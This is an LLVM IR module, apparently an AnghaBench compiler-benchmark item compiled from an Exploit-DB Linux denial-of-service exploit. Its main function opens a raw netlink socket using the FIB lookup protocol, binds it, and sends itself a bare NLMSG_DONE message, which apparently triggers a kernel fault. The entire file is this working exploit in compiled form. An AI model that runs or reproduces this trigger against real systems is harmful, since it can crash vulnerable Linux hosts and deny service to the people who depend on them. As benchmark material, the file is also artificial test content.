; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_29916.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_29916.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.msg = type { %struct.TYPE_2__, i64, i32 }
%struct.TYPE_2__ = type { i32, i32 }
%struct.sockaddr_nl = type { %struct.TYPE_2__, i64, i32 }
%struct.sockaddr = type { i32 }

@AF_NETLINK = common dso_local global i32 0, align 4
@SOCK_RAW = common dso_local global i32 0, align 4
@NETLINK_FIB_LOOKUP = common dso_local global i32 0, align 4
@NLMSG_DONE = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca %struct.msg, align 8
  %3 = alloca %struct.sockaddr_nl, align 8
  %4 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  %5 = call i32 @memset(%struct.sockaddr_nl* %3, i32 0, i32 24)
  %6 = load i32, i32* @AF_NETLINK, align 4
  %7 = getelementptr inbounds %struct.sockaddr_nl, %struct.sockaddr_nl* %3, i32 0, i32 2
  store i32 %6, i32* %7, align 8
  %8 = call i64 (...) @getpid()
  %9 = getelementptr inbounds %struct.sockaddr_nl, %struct.sockaddr_nl* %3, i32 0, i32 1
  store i64 %8, i64* %9, align 8
  %10 = load i32, i32* @AF_NETLINK, align 4
  %11 = load i32, i32* @SOCK_RAW, align 4
  %12 = load i32, i32* @NETLINK_FIB_LOOKUP, align 4
  %13 = call i32 @socket(i32 %10, i32 %11, i32 %12)
  store i32 %13, i32* %4, align 4
  %14 = icmp sgt i32 %13, 0
  %15 = zext i1 %14 to i32
  %16 = call i32 @assert(i32 %15)
  %17 = load i32, i32* %4, align 4
  %18 = bitcast %struct.sockaddr_nl* %3 to %struct.sockaddr*
  %19 = call i64 @bind(i32 %17, %struct.sockaddr* %18, i32 24)
  %20 = icmp eq i64 %19, 0
  %21 = zext i1 %20 to i32
  %22 = call i32 @assert(i32 %21)
  %23 = getelementptr inbounds %struct.sockaddr_nl, %struct.sockaddr_nl* %3, i32 0, i32 1
  store i64 0, i64* %23, align 8
  %24 = bitcast %struct.msg* %2 to %struct.sockaddr_nl*
  %25 = call i32 @memset(%struct.sockaddr_nl* %24, i32 0, i32 24)
  %26 = getelementptr inbounds %struct.msg, %struct.msg* %2, i32 0, i32 0
  %27 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %26, i32 0, i32 0
  store i32 24, i32* %27, align 8
  %28 = load i32, i32* @NLMSG_DONE, align 4
  %29 = getelementptr inbounds %struct.msg, %struct.msg* %2, i32 0, i32 0
  %30 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %29, i32 0, i32 1
  store i32 %28, i32* %30, align 4
  %31 = load i32, i32* %4, align 4
  %32 = bitcast %struct.msg* %2 to %struct.sockaddr_nl*
  %33 = bitcast %struct.sockaddr_nl* %3 to i8*
  %34 = call i64 @sendto(i32 %31, %struct.sockaddr_nl* %32, i32 24, i32 0, i8* %33, i32 24)
  %35 = icmp sgt i64 %34, 0
  %36 = zext i1 %35 to i32
  %37 = call i32 @assert(i32 %36)
  ret i32 0
}

declare dso_local i32 @memset(%struct.sockaddr_nl*, i32, i32) #1

declare dso_local i64 @getpid(...) #1

declare dso_local i32 @assert(i32) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i64 @bind(i32, %struct.sockaddr*, i32) #1

declare dso_local i64 @sendto(i32, %struct.sockaddr_nl*, i32, i32, i8*, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
